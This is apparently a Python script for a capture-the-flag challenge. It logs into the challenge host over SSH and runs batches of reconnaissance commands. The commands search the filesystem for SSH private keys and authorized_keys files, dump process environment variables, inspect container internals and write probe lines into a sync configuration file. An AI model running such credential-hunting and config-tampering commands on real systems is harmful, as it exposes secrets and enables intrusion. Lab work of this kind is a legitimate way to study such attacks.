#!/usr/bin/env python3
"""
Stolen Schematics - Deep Minecraft Server Analysis

Looking for:
1. Container image name/tag
2. Sync mechanism details
3. Way to access another game server
"""

import paramiko
import time
import sys

HOST = "instance.ctf.tdho.st"
PORT = 32867
USER = "player"
PASSWORD = "reyalp"

def execute_command(ssh, command, wait_time=2):
    """Execute a command and return output"""
    try:
        stdin, stdout, stderr = ssh.exec_command(command, timeout=20)
        time.sleep(wait_time)
        
        output = stdout.read().decode('utf-8', errors='ignore')
        error = stderr.read().decode('utf-8', errors='ignore')
        
        print(f"\n[CMD] {command}")
        if output:
            print(output)
        if error and "Permission denied" not in error and "No such file" not in error and error.strip():
            print(f"[ERR] {error}")
        
        return output, error
    except Exception as e:
        print(f"[-] Error executing '{command}': {e}")
        return "", str(e)

def main():
    print("="*70)
    print("Stolen Schematics - Deep MC Server & Sync Mechanism Analysis")
    print("="*70)
    
    try:
        import paramiko
        
        print(f"\n[*] Connecting to {HOST}:{PORT}...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD, timeout=30)
        print("[+] Connected!")
        
        # Check the mountinfo for image details
        print("\n" + "="*70)
        print("EXTRACTING CONTAINER IMAGE INFO FROM MOUNTINFO")
        print("="*70)
        
        image_commands = [
            "cat /proc/1/mountinfo | grep overlayfs",
            "cat /proc/1/mountinfo | grep lowerdir | head -1",
            "ls -la /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/ 2>/dev/null || echo 'No access'",
        ]
        
        for cmd in image_commands:
            execute_command(ssh, cmd)
        
        # Check for image metadata files
        print("\n" + "="*70)
        print("SEARCHING FOR IMAGE METADATA")
        print("="*70)
        
        metadata_commands = [
            "find / -name 'image-spec*' 2>/dev/null",
            "find / -name 'manifest*' -type f 2>/dev/null | grep -v proc | head -20",
            "find / -name '*.json' -path '*/var/lib/*' 2>/dev/null | head -20",
            "cat /.dockerenv 2>&1 || echo 'No .dockerenv content'",
        ]
        
        for cmd in metadata_commands:
            execute_command(ssh, cmd, wait_time=4)
        
        # Monitor the sync-loop behavior more carefully
        print("\n" + "="*70)
        print("DEEP ANALYSIS OF SYNC MECHANISM")
        print("="*70)
        
        sync_commands = [
            "cat /opt/mc/config/sync-request.conf",
            "ls -la /proc/16/",  # PID 16 is sync-loop.sh
            "cat /proc/16/status",
            "ls -la /proc/16/fd/",
            "cat /proc/16/maps | grep sync",
            "lsof -p 16 2>/dev/null || echo 'No lsof'",
        ]
        
        for cmd in sync_commands:
            execute_command(ssh, cmd)
        
        # Check if there's anything in the sync volume we missed
        print("\n" + "="*70)
        print("THOROUGH SYNC VOLUME CHECK")
        print("="*70)
        
        sync_vol_commands = [
            "ls -laR /opt/mc/.sync 2>&1 | head -50",
            "find /opt/mc/.sync -type f 2>&1",
            "stat /opt/mc/.sync 2>&1",
            "mount | grep sync",
        ]
        
        for cmd in sync_vol_commands:
            execute_command(ssh, cmd)
        
        # Look for any SSH keys we might use to access other containers
        print("\n" + "="*70)
        print("SEARCHING FOR SSH KEYS")
        print("="*70)
        
        key_commands = [
            "ls -la ~/.ssh 2>&1 || echo 'No .ssh'",
            "ls -la /root/.ssh 2>&1 || echo 'No /root/.ssh access'",
            "find / -name 'id_rsa' 2>/dev/null",
            "find / -name 'id_*' -path '*/.ssh/*' 2>/dev/null",
            "find / -name 'authorized_keys' 2>/dev/null",
        ]
        
        for cmd in key_commands:
            execute_command(ssh, cmd, wait_time=3)
        
        # Check environment variables more thoroughly
        print("\n" + "="*70)
        print("ENVIRONMENT ANALYSIS")
        print("="*70)
        
        env_commands = [
            "cat /proc/1/environ | tr '\\0' '\\n'",
            "cat /proc/16/environ | tr '\\0' '\\n'",
            "env",
        ]
        
        for cmd in env_commands:
            execute_command(ssh, cmd)
        
        # Try writing to places that sync-loop might read from
        print("\n" + "="*70)
        print("TESTING POTENTIAL SYNC EXPLOIT VECTORS")
        print("="*70)
        
        exploit_commands = [
            "echo 'test-payload' > /opt/mc/config/test.conf 2>&1",
            "cat /opt/mc/config/test.conf 2>/dev/null",
            "echo 'exploit-test=true' >> /opt/mc/config/sync-request.conf 2>&1",
            "cat /opt/mc/config/sync-request.conf",
        ]
        
        for cmd in exploit_commands:
            execute_command(ssh, cmd)
        
        ssh.close()
        print("\n[+] Deep analysis complete!")
        
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
